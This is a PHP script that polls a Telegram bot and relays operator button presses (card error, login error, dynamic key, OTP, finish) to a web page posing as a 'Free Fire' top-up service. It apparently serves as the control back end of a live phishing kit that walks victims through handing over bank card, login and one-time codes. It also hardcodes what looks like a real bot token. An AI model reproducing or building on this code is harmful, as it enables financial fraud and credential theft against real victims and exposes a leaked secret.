<?php
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: '8262215506:AAHJjbwyPCnu7AwwWoLypQRSRAb-GWlLCD8';
$apiBase  = "https://api.telegram.org/bot{$botToken}";

// Archivo para almacenar acciones pendientes
$actionsFile = __DIR__ . '/pending_actions.json';

function tg_call($method, $params = [])
{
    global $apiBase;
    $url = $apiBase . '/' . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function saveAction($action, $data = [])
{
    global $actionsFile;
    $actions = file_exists($actionsFile) ? json_decode(file_get_contents($actionsFile), true) : [];
    $actions[] = [
        'action' => $action,
        'data' => $data,
        'timestamp' => time()
    ];
    file_put_contents($actionsFile, json_encode($actions));
}

function getNextAction()
{
    global $actionsFile;
    if (!file_exists($actionsFile)) return null;
    
    $actions = json_decode(file_get_contents($actionsFile), true);
    if (empty($actions)) return null;
    
    $action = array_shift($actions);
    file_put_contents($actionsFile, json_encode($actions));
    return $action;
}

function clearActions()
{
    global $actionsFile;
    file_put_contents($actionsFile, json_encode([]));
}

// Limpiar acciones si se solicita
if (isset($_GET['clear'])) {
    clearActions();
    echo json_encode(['status' => 'cleared']);
    exit;
}

$offset = file_exists('tg_offset.txt') ? (int)file_get_contents('tg_offset.txt') : 0;

$updates = tg_call('getUpdates', ['offset' => $offset, 'timeout' => 30]);

if ($updates && isset($updates['result'])) {
    foreach ($updates['result'] as $update) {
        $offset = max($offset, $update['update_id'] + 1);
        
        // Manejar callbacks de botones inline
        if (isset($update['callback_query'])) {
            $callback = $update['callback_query'];
            $callbackData = $callback['data'];
            $chatId = $callback['message']['chat']['id'] ?? null;
            
            // Responder al callback
            tg_call('answerCallbackQuery', [
                'callback_query_id' => $callback['id'],
                'text' => 'Procesando...'
            ]);
            
            // Procesar según el tipo de callback
            if (strpos($callbackData, 'ACTION:') === 0) {
                $action = str_replace('ACTION:', '', $callbackData);
                
                switch ($action) {
                    case 'NEXT_AUT':
                        saveAction('NEXT_AUT');
                        break;
                    case 'NEXT_DIN':
                        saveAction('NEXT_DIN');
                        break;
                    case 'NEXT_OTP':
                        saveAction('NEXT_OTP');
                        break;
                    case 'ERR_TC':
                        saveAction('ERR_TC');
                        break;
                    case 'ERR_LOGIN':
                        saveAction('ERR_LOGIN');
                        break;
                    case 'ERR_DIN':
                        saveAction('ERR_DIN');
                        break;
                    case 'ERR_OTP':
                        saveAction('ERR_OTP');
                        break;
                    case 'FINISH':
                        saveAction('FINISH');
                        break;
                }
            }
        }
        
        // Manejar mensajes de texto (código existente)
        if (isset($update['message'])) {
            $message = $update['message'];
            $chat_id = $message['chat']['id'];
            $text = $message['text'] ?? '';
            
            // Responder a comandos
            if ($text === '/start') {
                tg_call('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => '¡Hola! Soy tu bot de recargas Free Fire.'
                ]);
            }
        }
    }
    
    file_put_contents('tg_offset.txt', $offset);
}

// Verificar si hay acciones pendientes
$nextAction = getNextAction();
if ($nextAction) {
    echo json_encode([
        'status' => 'ok', 
        'offset' => $offset,
        'data' => $nextAction
    ]);
} else {
    echo json_encode(['status' => 'ok', 'offset' => $offset]);
}
